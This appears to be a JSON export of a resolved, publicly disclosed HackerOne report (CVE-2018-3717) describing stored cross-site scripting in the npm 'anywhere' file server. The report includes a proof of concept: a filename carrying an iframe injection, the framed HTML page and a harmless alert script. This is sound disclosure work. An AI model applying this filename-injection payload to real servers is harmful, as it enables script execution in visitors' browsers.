{
  "id": 309394,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDkzOTQ=",
  "url": "https://hackerone.com/reports/309394",
  "title": "[anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-01-25T22:02:33.743Z",
  "submitted_at": "2018-01-25T22:02:33.743Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-3717"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-02-26T21:36:11.607Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-02-26T21:36:03.624Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\n**anywhere** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.\n\n**Module:** \n\nRunning static file server anywhere.\n\nhttps://www.npmjs.com/package/anywhere\n\n**Description**\n\n\n\nTo embed malicious ```<script>``` tag with JavaScript code to execute, ```/``` character is necessary.\nIn all operating systems, ```/``` is not allowed as a character used in file name. This means there is very few option to craft an attack using file name as injection point.\n\n## Steps To Reproduce:\n\nHowever, if attacker wants to, one can still use some tricks and change one of the filenames into something like following example:\n\n```\n\"><iframe src=\"malware_frame.html\">\n```\n\nThen, HTML file with following content have to be saved in the same directory as file with the name changed:\n\n```html\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script type=\"text/javascript\" src=\"malware.js\"></script>\n</body>\n\n</html>\n```\n\nAn ```src``` attribute value I've used here is just for PoC purpose, this can be any external url.\nOn my local machine, ```malware.js``` has following content:\n\n```javascript\nalert('Uh oh, I am very bad malware!')\n```\n\nNow, if you run ```anywhere``` in directory where both file with filename changed and ```malware_frame.html``` are saved:\n\n```\n$ ./node_modules/anywhere/bin/anywhere -p 8080\nRunning at http://192.168.1.1:8080/\nAlso running at https://192.168.1.1:8081/\n```\n\nand open ```http://127.0.0.1:8080``` in the browser, you can see JavaScript from ```malware.js``` is executed:\n\n{F257400}\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nExploitation of this vulnerability in the wild might be hard, however it's not impossible and it depends only on attacker's skills to get into directory on the server, where ```anywhere``` is used to serve static content.",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 257400,
      "file_name": "1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/400/4ad79e07ebfe740d475a2ba1bc133f5d0efd6452/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRJA6IDM5%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T184850Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF9ET4hr4ZTnbtO2pAIWv2UAweM96i1WrX7LBITwnHiwAiEAiX3EiP%2FRMpvk6b8SDA2%2F0Q4qQ4hQk5sCnwZz%2BFyoNXMqsgUIGRADGgwwMTM2MTkyNzQ4NDkiDBm%2BtUvOVk%2FC2SESLSqPBXzH3MSWfNOTTDD79tVYg0VY0W2n236ryhYLAfHDMiKc2GLJ1OofMH%2FMwSDTjDJ9c6GiToqLtNmDmthf%2BAsMeaVpWrpqSAEqjBWwPcLkvyN%2FU94cWXtp7yAGHg6OAeyn%2FUQTPkjro1UU9ZC93ArVp3jrlaibi8trjUWjR3E4exZ8Am9LvpEL9Lz4OAYLE60ngE4gXy%2FyDs37I2H9LPcYCoPUkD8dFZmv06%2BhYDwz%2BEfUYq4WsNgZ6PO29r3brW73CpjvRbrre0YQ%2F2fP4OEjJqBPzhJuWLSECU9JYEREwQN%2Fcn%2B9PlJVISm0RLk73u6yZq743V8yDognTDCgdxJbTM%2BNYwQk9HZljLSUTytH4akSzTaQ0UUStHiRu4c1MW%2FPN67glq2G%2FfNiVf0QhyF3lVWATxbVc3C0HLwvsieyjjw%2FjVcsr99p28CnTJl8m%2F2BM3wzPzSRrHC9QRcNxbtvDb80v1rL6G20IgfKLqFESGTnTlSsUFfA5n%2FqT8bxm8TJE2F01klIQnvBdnQI3rKxuKq53R%2FESRDDM8qbGBXvY6qv4IhD%2BVLWu3OuP%2FKe83aLam9VJVQoKEGIK1i9qeqx4KUzr2bxxr6oAmF%2BaI9qvjfo%2BH3ijivFsbjnexVCXtoqeZdb%2BoIxkLIpplq1ZhzuPRbkNQrH8SDbYEhalqYfnT2cqDrw%2BjAhCwjDC3D73L%2BmO07k8Kz4Sb3T4U1pAVM42iG8fSsWu1%2FV6FTIw6M4V9lolktMGiB93YGwo%2BKtYwJH%2BEWidA6AVUn4ZeoPZcZp7bXJLo%2FdYTy12VzRyxqfEcwGqzwgRv2hLpeBnk0FMTNurEVPpbLZADKvddyrrM99l6A05D4HoaMJn9328cdaRtsws7rAxgY6sQFoNpLnIjdQxdqmFp9oOuVXCeWphTtjDGNY5ZRU9h44XByX90iAp2R6SDfP4%2Fcf89EngImegV0yGzNWtP0Ma%2B1QTxMJkHisN8q3zL3xzZmXCtBpEbdT%2FKXdIkTJe9%2FtIRSmmI9OA2Be9npU%2BNjgCHk%2FZ3rBDAGe4YFAoZ946HDMpcn8ytr8f2Gr%2FyVw%2FD%2FYuLLbcLXei10yrXlvLwwCLfJeSpwl7Hdvq5tJUnrOP8abKrc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b1a610186013e4b173b75bb3884a2e77331d5ccf9812cda8dcf0cab4ca112223",
      "file_size": 357574,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-03-28T21:36:03.733Z",
  "allow_singular_disclosure_after": -236207567.0204385,
  "singular_disclosure_allowed": true,
  "vote_count": 6,
  "voters": [
    "apapedulimu",
    "dudez",
    "eveeez",
    "13ern",
    "khaledibnalwalid",
    "madhuri_jan02"
  ],
  "severity": {
    "rating": "critical",
    "score": 9.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 5782,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "anywhere",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
